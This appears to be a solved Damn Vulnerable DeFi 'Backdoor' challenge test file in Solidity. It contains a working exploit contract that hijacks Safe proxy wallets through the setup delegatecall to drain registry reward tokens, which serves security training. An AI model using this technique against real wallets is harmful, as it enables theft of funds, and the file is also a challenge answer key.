// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

import {SafeProxy, IProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(0x82b42900); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // SYSTEM:
        // -- WalletRegistry: contract that rewards registered users for creating wallets on SafeProxyFactory
        // -- SafeProxyFactory(walletFactory): contract which deployes SafeProxy contracts(wallets) pointing to Safe logic(singletonCopy) and calls WalletRegistry::proxyCreated
        // -- Safe(singletonCopy): logic contract for SafeProxy

        // HOW WOULD A REGISTERED USER CREATE A WALLET?
        // --- User calls SafeProxyFactory::createProxyWithCallback using WalletRegistry as callback and singletonCopy(Safe) as logic _singleton
        // ------ SafeProxyFactory creates a SafeProxy pointing to singletonCopy(Safe)
        // ------ Calls Safe:setup on newly deployed wallet (SafeProxy, remember its SafeProxyFactory::deployProxy -> SafeProxy::fallback -> Safe::setup)
        // --------- SafeProxy delegate calls to singletonCopy(Safe) on Safe::setup
        // ------------ Safe::setup logic is being executed
        // ------------ Safe::setup has an optional delegate call to a custom address with custom data
        // ------ After the Safe::setup is finished, SafeProxyFactory calls WalletRegistry::proxyCreated
        // --------- WalletRegistry::proxyCreated checks if the SafeProxy was created by the correct factory(walletFactory) and if the SafeProxy points to the correct logic(singletonCopy)

        // Prepare arrays of beneficiaries (simulate Safe::getOwners)
        address[][] memory beneficiaries = new address[][](4);
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            beneficiaries[i] = new address[](1);
            beneficiaries[i][0] = users[i];
        }

        // Start attack chain
        new Exploit(walletFactory, walletRegistry, token, beneficiaries, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract Exploit {
    address implementation;

    constructor(
        SafeProxyFactory walletFactory,
        WalletRegistry walletRegistry,
        DamnValuableToken token,
        address[][] memory beneficiaries,
        address recovery
    ) {
        address badImplementation = address(new BadImplementation());

        BadImplementation[] memory wallets =
            _createWallets(beneficiaries, badImplementation, walletFactory, walletRegistry);

        _takeTokens(token, wallets, recovery);
    }

    function _createWallets(
        address[][] memory beneficiaries,
        address badImplementation,
        SafeProxyFactory walletFactory,
        WalletRegistry walletRegistry
    ) private returns (BadImplementation[] memory) {
        address to = badImplementation;
        address singletonCopy = walletRegistry.singletonCopy();

        BadImplementation[] memory wallets = new BadImplementation[](beneficiaries.length);

        for (uint256 i = 0; i < beneficiaries.length; i++) {
            bytes memory data = abi.encodeWithSelector(
                BadImplementation.changeImplementation.selector, badImplementation, beneficiaries[i][0]
            );

            bytes memory initializer =
                abi.encodeWithSelector(Safe.setup.selector, beneficiaries[i], 1, to, data, 0, 0, 0, address(0));

            BadImplementation wallet = BadImplementation(
                address((walletFactory.createProxyWithCallback(singletonCopy, initializer, 0, walletRegistry)))
            );

            wallets[i] = wallet;
        }

        return wallets;
    }

    // Approve Exploit for SafeProxy's tokens and transfer them to recovery
    function _takeTokens(DamnValuableToken token, BadImplementation[] memory wallets, address recovery) private {
        for (uint256 i = 0; i < wallets.length; i++) {
            wallets[i].approve(token, address(this));
            token.transferFrom(address(wallets[i]), recovery, 10e18);
        }
    }
}

contract BadImplementation {
    address implementation;

    address beneficiary;

    // Function for hijacking the implementation of the "wallet" - SafeProxy
    function changeImplementation(address newImplementation, address newBeneficiary) external {
        implementation = newImplementation;
        beneficiary = newBeneficiary;
    }

    // Proxy approves to take the tokens from it
    function approve(DamnValuableToken token, address spender) external {
        token.approve(spender, 10e18);
    }

    ////// MIRROR FUNCTIONS FROM Safe.sol //////

    function getThreshold() external pure returns (uint256) {
        return 1;
    }

    function getOwners() external view returns (address[] memory) {
        address[] memory owners = new address[](1);
        owners[0] = beneficiary;
        return owners;
    }

    function getStorageAt(uint256, uint256) external pure returns (bytes memory) {
        return abi.encode(address(0));
    }
}
